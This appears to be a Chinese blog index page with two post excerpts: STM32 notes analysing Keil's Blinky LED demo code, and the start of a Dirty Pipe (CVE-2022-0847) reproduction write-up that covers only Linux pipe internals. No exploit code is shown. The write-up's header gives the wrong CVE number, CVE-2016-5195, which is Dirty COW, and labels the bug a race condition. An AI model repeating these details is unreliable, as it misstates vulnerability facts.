<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"hornos3.github.com","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="CoLin&#39;s BLOG">
<meta property="og:url" content="http://hornos3.github.com/page/2/index.html">
<meta property="og:site_name" content="CoLin&#39;s BLOG">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="CoLin">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://hornos3.github.com/page/2/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>CoLin's BLOG</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">CoLin's BLOG</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2024/03/29/STM32%E5%AD%A6%E4%B9%A0-1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/03/29/STM32%E5%AD%A6%E4%B9%A0-1/" class="post-title-link" itemprop="url">STM32学习 (1)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2024-03-29 12:42:50 / 修改时间：18:34:37" itemprop="dateCreated datePublished" datetime="2024-03-29T12:42:50+08:00">2024-03-29</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F/" itemprop="url" rel="index"><span itemprop="name">嵌入式</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>6k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>5 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>实验室研究需要，有关物联网的一些基础还是需要掌握的。于是开始研究实验室买的STM板子，下面通过一个官方demo进行基础内容的学习。</p>
<h1 id="准备工作"><a class="markdownIt-Anchor" href="#准备工作"></a> 准备工作</h1>
<p>我使用的开发板是STM32F429 Nucleo-144，MCU为STM32F429ZIT6，属于STM32系列中的高性能MCU。从官网查询信息可知，该MCU一共带有2MB的Flash以及256KB的RAM，核心频率可达180MHz。开发板如下图所示。</p>
<p><img src="2.jpg" alt="" /></p>
<p>下面使用Keil进行分析。在官网下载Keil之后安装，UV4目录中有IDE的启动程序UV4.exe以及包管理器PackInstaller.exe。</p>
<p>打开PackInstaller，左边选择Devices可以找到上面的MCU型号，选择后，右边有Packs和Examples。Packs为开发时可能需要的硬件支持包，包含对各类外设的处理等，Examples则是可以直接烧录到开发板上的demo示例。</p>
<p>在Pack一栏，我安装了2个Device Specific包，Generic中则安装有：</p>
<ul>
<li>ARM::CMSIS</li>
<li>ARM::CMSIS-Driver</li>
<li>ARM::CMSIS-DSP</li>
<li>ARM::CMSIS-NN</li>
<li>Keil::ARM_Compiler</li>
<li>Keil::MDK-Middleware</li>
<li>Keil::MDK-Middleware_Graphics</li>
</ul>
<p>如果需要安装其他包，只需直接点击安装即可，包管理器能够自动分析依赖并将某个包所依赖的所有包全部安装。</p>
<p>在Examples一栏中，前两个就是最简单的亮灯demo。在Install后Copy到某个目录下，使用Keil打开对应的项目文件即可打开demo。</p>
<p><img src="1.png" alt="" /></p>
<h1 id="程序分析"><a class="markdownIt-Anchor" href="#程序分析"></a> 程序分析</h1>
<p>打开Blinky项目，Source Files中只有一个Blinky.c文件，包含这个demo的主要逻辑。</p>
<p>下面简述这个demo的功能。</p>
<p>开发板下方左右各有一个按钮，左边蓝色右边黑色（黑色为复位按钮）。在MCU正上方有三个User LED，分别为LD1、LD2、LD3。将开发板上电后（USB应插入上面的USB接口而不是下面，插入后，该接口右边的COM指示灯亮起红灯，User LED右边的PWR指示灯亮起绿灯表示已经供电），在用户无操作时，LD1到LD3依次亮起绿、蓝、红三色灯，每一次点亮持续0.5s，随后熄灭，等待0.5秒后亮起下一个灯，一次循环为3s时间。在循环过程中，如果用户按下蓝色按钮，则循环暂停，正在点亮的灯会持续点亮，如果灯全部熄灭则会持续熄灭。松开按钮后循环继续进行。如果用户按下黑色按钮，循环立即停止并将状态返回至循环开始。黑色按钮不松开时循环暂停，松开后循环重新开始。黑色按钮的优先级高于蓝色按钮，如果两个按钮均按下，则循环重置。</p>
<h2 id="mainc"><a class="markdownIt-Anchor" href="#mainc"></a> main.c</h2>
<p>这个项目使用了STM32 CubeMX自动构建项目，它能够为STM32项目提供初始化代码的模板，用户只需要在该模板基础上进行开发即可。不过我们这里暂且不研究这个模板的使用，主要还是以代码为主。</p>
<p>在main.c中，最重要的就属main函数了。在blinky中，由于只需要完成用户LED的简单点亮操作，因此不需要将进行多余的初始化操作。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  HAL_Init();</span><br><span class="line">  SystemClock_Config();</span><br><span class="line">  SystemCoreClockUpdate();</span><br><span class="line">  MX_GPIO_Init();</span><br><span class="line">  osKernelInitialize();</span><br><span class="line">  osThreadNew(app_main, <span class="literal">NULL</span>, &amp;app_main_attr);</span><br><span class="line">  osKernelStart();</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>)&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里基本都是一些与初始化相关的函数。<code>HAL_Init</code>用于初始化外设，下面两个与系统时钟相关，<code>MX_GPIO_Init</code>初始化GPIO引脚，随后<code>osKernelInitialize</code>是操作系统的初始化，这里的操作系统指的是封装了CMSIS-OS的FreeRTOS。CMSIS-RTOS是一层可以封装在不同RTOS上的一个API层，能够为用户提供统一的API，便于编程。这里进行初始化之后调用了<code>osThreadNew</code>函数创建了一个线程，线程执行的函数是<code>app_main</code>，参数为NULL，即没有参数，线程属性为<code>&amp;app_main_attr</code>。线程属性定义了这个线程拥有的栈空间地址及大小，后面在Blinky.c中可以找到。随后<code>osKernelStart</code>即启动OS内核，开始执行用户线程。</p>
<h2 id="blinkyc"><a class="markdownIt-Anchor" href="#blinkyc"></a> Blinky.c</h2>
<p>Blinky.c的内容并不多：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*----------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"> * Name:    Blinky.c</span></span><br><span class="line"><span class="comment"> * Purpose: LED Flasher</span></span><br><span class="line"><span class="comment"> *----------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"> * This file is part of the uVision/ARM development tools.</span></span><br><span class="line"><span class="comment"> * This software may only be used under the terms of a valid, current,</span></span><br><span class="line"><span class="comment"> * end user licence from KEIL for a compatible version of KEIL software</span></span><br><span class="line"><span class="comment"> * development tools. Nothing else gives you the right to use this software.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This software is supplied &quot;AS IS&quot; without warranties of any kind.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Copyright (c) 2017-2021 Keil - An ARM Company. All rights reserved.</span></span><br><span class="line"><span class="comment"> *----------------------------------------------------------------------------*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;main.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Board_LED.h&quot;</span>                  <span class="comment">/* ::Board Support:LED */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Board_Buttons.h&quot;</span>              <span class="comment">/* ::Board Support:Buttons */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;RTE_Components.h&quot;</span>             <span class="comment">/* Component selection */</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Main stack size must be multiple of 8 Bytes</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> APP_MAIN_STK_SZ (512U)</span></span><br><span class="line"><span class="type">uint64_t</span> app_main_stk[APP_MAIN_STK_SZ / <span class="number">8</span>];</span><br><span class="line"><span class="type">const</span> osThreadAttr_t app_main_attr = &#123;</span><br><span class="line">  .stack_mem  = &amp;app_main_stk[<span class="number">0</span>],</span><br><span class="line">  .stack_size = <span class="keyword">sizeof</span>(app_main_stk)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">volatile</span> <span class="type">uint32_t</span> delay_val = <span class="number">500U</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> osThreadId_t tid_thrLED;         <span class="comment">/* Thread id of thread: LED */</span></span><br><span class="line"><span class="type">static</span> osThreadId_t tid_thrBUT;         <span class="comment">/* Thread id of thread: BUT */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*----------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">  thrLED: blink LED</span></span><br><span class="line"><span class="comment"> *----------------------------------------------------------------------------*/</span></span><br><span class="line">__NO_RETURN <span class="type">static</span> <span class="type">void</span> <span class="title function_">thrLED</span><span class="params">(<span class="type">void</span> *argument)</span> &#123;</span><br><span class="line">  <span class="type">uint32_t</span> led_max    = LED_GetCount();</span><br><span class="line">  <span class="type">uint32_t</span> led_num    = <span class="number">0U</span>;</span><br><span class="line"></span><br><span class="line">  (<span class="type">void</span>)argument;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    osThreadFlagsWait(<span class="number">0x0001</span>U, osFlagsWaitAny ,osWaitForever);</span><br><span class="line">    LED_On(led_num);                                            <span class="comment">/* Turn specified LED on */</span></span><br><span class="line">    osThreadFlagsWait(<span class="number">0x0001</span>U, osFlagsWaitAny ,osWaitForever);</span><br><span class="line">    LED_Off(led_num);                                           <span class="comment">/* Turn specified LED off */</span></span><br><span class="line"></span><br><span class="line">    led_num++;                                                  <span class="comment">/* Change LED number */</span></span><br><span class="line">    <span class="keyword">if</span> (led_num &gt;= led_max) &#123;</span><br><span class="line">      led_num = <span class="number">0U</span>;                                             <span class="comment">/* Restart with first LED */</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*----------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">  thrBUT: check button state</span></span><br><span class="line"><span class="comment"> *----------------------------------------------------------------------------*/</span></span><br><span class="line">__NO_RETURN <span class="type">static</span> <span class="type">void</span> <span class="title function_">thrBUT</span><span class="params">(<span class="type">void</span> *argument)</span> &#123;</span><br><span class="line">  <span class="type">uint32_t</span> button_msk = (<span class="number">1U</span> &lt;&lt; Buttons_GetCount()) - <span class="number">1U</span>;</span><br><span class="line"></span><br><span class="line">  (<span class="type">void</span>)argument;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    osDelay(delay_val);                                 <span class="comment">/* Wait */</span></span><br><span class="line">    <span class="keyword">while</span> (Buttons_GetState() &amp; (button_msk));          <span class="comment">/* Wait while holding USER button */</span></span><br><span class="line">    osThreadFlagsSet(tid_thrLED, <span class="number">0x0001</span>U);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*----------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"> * Application main thread</span></span><br><span class="line"><span class="comment"> *---------------------------------------------------------------------------*/</span></span><br><span class="line">__NO_RETURN <span class="type">void</span> <span class="title function_">app_main</span> <span class="params">(<span class="type">void</span> *argument)</span> &#123;</span><br><span class="line"></span><br><span class="line">  (<span class="type">void</span>)argument;</span><br><span class="line"></span><br><span class="line">  LED_Initialize();                                     <span class="comment">/* initalize LEDs */</span></span><br><span class="line">  Buttons_Initialize();                                 <span class="comment">/* initalize Buttons */</span></span><br><span class="line"></span><br><span class="line">  tid_thrBUT = osThreadNew (thrBUT, <span class="literal">NULL</span>, <span class="literal">NULL</span>);        <span class="comment">/* create BUT thread */</span></span><br><span class="line">  <span class="keyword">if</span> (tid_thrBUT == <span class="literal">NULL</span>) &#123; <span class="comment">/* add error handling */</span> &#125;</span><br><span class="line"></span><br><span class="line">  tid_thrLED = osThreadNew (thrLED, <span class="literal">NULL</span>, <span class="literal">NULL</span>);        <span class="comment">/* create LED thread */</span></span><br><span class="line">  <span class="keyword">if</span> (tid_thrLED == <span class="literal">NULL</span>) &#123; <span class="comment">/* add error handling */</span> &#125;</span><br><span class="line"></span><br><span class="line">  osThreadExit();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先看到<code>app_main_attr</code>，这里定义了栈空间以及大小，使用了一个512字节的预分配空间。</p>
<p>然后是<code>app_main</code>函数，这是线程的入口点。其中首先对LED灯和按钮进行初始化，随后创建了两个子线程，分别执行<code>thrBUT</code>函数和<code>thrLED</code>函数，这两个函数没有指定栈空间，前者控制按钮，后者控制LED灯。</p>
<p>在<code>thrBUT</code>中有死循环，首先延时500ms，然后循环判断<code>Buttons_GetState() &amp; button_msk</code>的值，为0时退出循环并设置<code>tid_thrLED</code>的标志位为1，其中<code>tid_thrLED</code>为LED线程的线程标志。<code>Buttons_GetState</code>函数会返回一个int值，每一位都代表一个按钮的按下状态。在上面的开发板中只有一个用户按钮（Reset不算），因此该函数的返回值只能为0或1。button_msk的值为1，根据逻辑可以推断出：当按钮按下时，<code>Buttons_GetState</code>的返回值为1，否则为0。当用户没有操作时，内部的while循环总是不循环，即每过0.5s就将LED线程的标志位设置为1。</p>
<p>在<code>thrLED</code>中也存在一个死循环，首先调用<code>osThreadFlagsWait</code>，当该线程的标志位中有0x1，选项是<code>osFlagsWaitAny</code>，即永远（osWaitForever）等待标志位的最低位被设置为1，当检测到标志位被置位时，立即退出并将标志位复位为0。等待结束后打开LED灯，随后继续等待，等待后关闭LED灯，更换目标LED灯，继续循环。</p>
<p>整个过程非常清晰，延时的时间长度由<code>thrBUT</code>函数决定，当用户按下按钮时，相当于<code>thrBUT</code>函数阻塞在了内部的<code>while</code>循环中，暂时无法进行下一次置位。两个线程是一个“生产者与消费者”的关系，“消费”的对象就是LED线程的标志位。</p>
<p>通过上面的示例，我们对CMSIS-RTOS中不同线程之间的交互有了一定的了解。不同线程之间的交互可以通过标志位完成，以控制不同线程之间的逻辑时序。当然很显然仅通过这种方式进行交互还不够，如果需要数据传输则需要另外的方式。</p>
<h2 id="逆向分析"><a class="markdownIt-Anchor" href="#逆向分析"></a> 逆向分析</h2>
<p>除了分析C代码之外，简单分析下汇编代码也是有必要的。在Github中可以搜索到一个SVD-loader项目，它是一个Ghidra插件，能够在输入svd文件后自动分析文件中的外设定义，并将外设与对应内存建立联系，大大提高汇编代码及反汇编C代码的可读性。</p>
<p>每一个市面的MCU都可以找到其对应的svd文件，其中记录有所有外设的信息。最为重要的是所有外设映射的内存地址空间。在程序中，我们只能通过内存和寄存器来进行数据的存取，而无法直接与外设交互。即使是最底层的库，也不能脱离内存玩外设。为了解决这个问题，需要对MCU进行额外的设计，将外设与固定的内存地址建立映射关系。当代码访问到外设映射的内存地址时，MCU可以通过硬件找到外设对应的接口并完成相应操作。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2024/03/03/CVE-2022-0847%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/03/03/CVE-2022-0847%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95/" class="post-title-link" itemprop="url">CVE-2022-0847复现记录</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2024-03-03 20:45:19" itemprop="dateCreated datePublished" datetime="2024-03-03T20:45:19+08:00">2024-03-03</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-07-19 10:33:45" itemprop="dateModified" datetime="2024-07-19T10:33:45+08:00">2024-07-19</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/kernel-pwn-%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">kernel pwn 系列</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>6.4k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>6 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>Dirty Pipe漏洞较Dirty COW发现的时间较晚，但也正因为此，它影响了更多的Linux发行版。既然同是带Dirty的漏洞，这个漏洞就同样是与条件竞争有关。</p>
<p>漏洞：CVE-2016-5195</p>
<p>影响Linux版本：&gt;5.8, &lt;5.16.11 / 5.15.25 / 5.10.102</p>
<p>漏洞类型：竞争条件</p>
<p>使用Linux样本：5.16.10</p>
<p>编译环境：Ubuntu 20.04</p>
<p>参考资料：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/58489873">Linux管道基础知识</a></li>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11016?time__1311=mqmx0DyDuGYGuD0vo4%2BxOKD8DcAx9GCnYD&amp;alichlgref=https%3A%2F%2Fcn.bing.com%2F#toc-0">CVE-2022-0847漏洞分析</a></li>
</ul>
<h1 id="a-前置知识"><a class="markdownIt-Anchor" href="#a-前置知识"></a> A. 前置知识</h1>
<h2 id="a1-linux管道基础"><a class="markdownIt-Anchor" href="#a1-linux管道基础"></a> A.1 Linux管道基础</h2>
<p>Linux管道是Linux进程间通信的一种方式。它的表现形式比较容易理解。试想一下，将我们带入到Linux开发者的身份中来，如果我们需要设计进程之间通信的方式，最容易想到的是什么？是的，我们可以将管道以文件的形式进行设计：</p>
<ul>
<li>创建管道可以通过创建文件来完成，这个文件与一般的文件不同，可以设置读写权限。</li>
<li>若进程A与B之间需要进行通信，假设只有A发送数据给B，即单方向通信，那么通信步骤可以这样设计：
<ul>
<li>进程A需要传输数据时，向管道文件写入数据，此时文件中保存的是进程A的数据。</li>
<li>进程B需要接受数据时，向管道文件读取数据，读取完成的数据在管道文件中自动删除，保证文件中只剩下未被读取的数据。</li>
</ul>
</li>
</ul>
<p>从上面的示例来看，这是一种典型的“生产者-消费者”模式，相信大家在学习线程的基础知识时已经了解过。当然为了实际使用的便捷考虑，最终的设计比上面的示例要复杂许多。</p>
<p>在Linux中有两类管道，一类是匿名管道，像shell命令中的’|'实际上就是创建了一个匿名管道，还有在程序内部父进程与子进程使用的一些管道为匿名管道。匿名管道由于没有命名，因此对外界是不可见的。另一类则是命名管道，这种管道有实际名字，可以在文件系统中被任何进程所访问，因此相较于匿名管道更为“开放”。</p>
<p>如果我们创建一个命名的管道文件，使用ls命令查看时，它的权限字符串以p开头，表示管道文件。打开这类文件产生的文件描述符不能被传入<code>lseek</code>中，因此可以想见管道文件的<code>file_operations</code>中<code>lseek</code>字段为<code>NULL</code>。</p>
<h2 id="a2-linux管道内部机制"><a class="markdownIt-Anchor" href="#a2-linux管道内部机制"></a> A.2 Linux管道内部机制</h2>
<p>上面我们了解了Linux管道的基础知识，下面我们需要深入到Linux内核了解它的实现机制。</p>
<p>既然管道是以文件的形式存在，那么在文件系统中就必然存在它对应的inode，只不过这个inode没有表示实际文件，是一个虚拟的inode。</p>
<p>在Linux内核中，表示inode的结构体为@<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.16.10/source/include/linux/pipe_fs_i.h#L58"><code>pipe_inode_info</code></a>，在结构体@<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.16.10/source/include/linux/fs.h#L620">inode</a>中有一个union字段，根据不同的文件类型有不同的结构体：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span>	*<span class="title">i_pipe</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">cdev</span>		*<span class="title">i_cdev</span>;</span></span><br><span class="line">    <span class="type">char</span>			*i_link;</span><br><span class="line">    <span class="type">unsigned</span>		i_dir_seq;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>下面，我们通过<code>pipe</code>系统调用跟踪内核创建管道文件的过程。</p>
<p><code>pipe</code>系统调用和<code>pipe2</code>都可以用于创建管道，唯一的区别是参数不同，<code>pipe2</code>可以多指定一个<code>flags</code>参数，主要用于管道操作的一些细节。</p>
<p>既然<code>pipe</code>系统调用可以返回两个整数文件描述符，那么我们实际上可以将其看做文件。既然是文件，那么在拥有文件描述符后必然就会拥有<strong>对应的file_operations实例</strong>。对于管道文件。它的<code>file_operations</code>为<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.16.10/source/fs/pipe.c#L1214">@<code>pipefifo_fops</code></a>。其中定义了对管道的读操作应该调用<code>pipe_read</code>，写操作应该调用<code>pipe_write</code>。这两个函数与本漏洞密切相关，下面简单分析一下。</p>
<h3 id="pipe_read"><a class="markdownIt-Anchor" href="#pipe_read"></a> <code>pipe_read</code></h3>
